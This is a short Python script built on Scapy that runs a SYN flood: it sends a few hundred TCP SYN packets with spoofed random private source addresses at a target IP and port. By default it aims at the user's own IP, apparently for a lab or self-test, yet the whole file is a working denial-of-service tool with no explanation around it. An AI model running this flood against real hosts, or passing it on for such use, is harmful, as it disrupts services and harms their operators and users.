from scapy.all import Ether, IP, TCP, sendp
import random
from secrets_loader import MY_IP, MY_MAC, MY_IFACE

def main(target_ip=MY_IP, target_port=8080, count=300):
    print(f"[+] Starting SYN Flood on {target_ip}:{target_port}")
    ether = Ether(src=MY_MAC, dst="ff:ff:ff:ff:ff:ff")
    for _ in range(count):
        ip = IP(src=f"192.168.{random.randint(1,254)}.{random.randint(1,254)}", dst=target_ip)
        tcp = TCP(sport=random.randint(1024,65535), dport=target_port, flags="S", seq=random.randint(0,4294967295))
        pkt = ether / ip / tcp
        sendp(pkt, iface=MY_IFACE, verbose=False)
    print("[+] SYN Flood complete")

if __name__ == "__main__":
    main()
